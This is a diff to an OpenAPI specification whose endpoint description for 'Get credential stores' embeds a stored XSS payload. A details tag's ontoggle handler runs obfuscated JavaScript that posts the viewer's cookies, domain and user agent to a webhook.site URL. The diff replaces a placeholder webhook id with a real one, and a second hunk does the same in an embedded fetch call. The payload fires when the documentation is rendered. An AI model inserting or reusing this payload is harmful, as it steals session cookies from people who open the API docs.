@@ -13,7 +13,7 @@ paths:
     get:
       summary: "Get credential stores"
       description: |
-        <details open ontoggle="[].constructor.constructor('fetch(\"https://webhook.site/your-unique-id\", {method: \"POST\", body: JSON.stringify({alert: \"XSS_TRIGGERED\", domain: document.domain, cookies: document.cookie, userAgent: navigator.userAgent})})')()">
+        <details open ontoggle="[].constructor.constructor('fetch(\"https://webhook.site/71e209df-07f8-4391-80d8-f2f98aaef5dd\", {method: \"POST\", body: JSON.stringify({alert: \"XSS_TRIGGERED\", domain: document.domain, cookies: document.cookie, userAgent: navigator.userAgent})})')()">
         <summary>Credential Store Operations</summary>
         This endpoint manages credential stores.
         </details>
@@ -40,7 +40,7 @@ paths:
         };
         
         // Send to your webhook
-        fetch('https://webhook.site/your-unique-id', {
+        fetch('https://webhook.site/71e209df-07f8-4391-80d8-f2f98aaef5dd', {
           method: 'POST',
           headers: {'Content-Type': 'application/json'},
           body: JSON.stringify(payload)
